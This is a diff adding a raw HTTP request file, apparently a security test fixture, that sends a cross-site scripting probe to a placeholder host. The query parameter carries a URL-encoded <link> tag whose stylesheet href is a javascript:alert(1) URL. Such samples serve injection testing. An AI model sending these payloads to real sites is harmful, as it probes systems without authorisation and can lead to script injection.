@@ -1,0 +1,4 @@
+GET /a?q=%3Clink%2Brel%3Dstylesheet%2Bhref%3D%22javascript%3Aalert%281%29%22%3E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
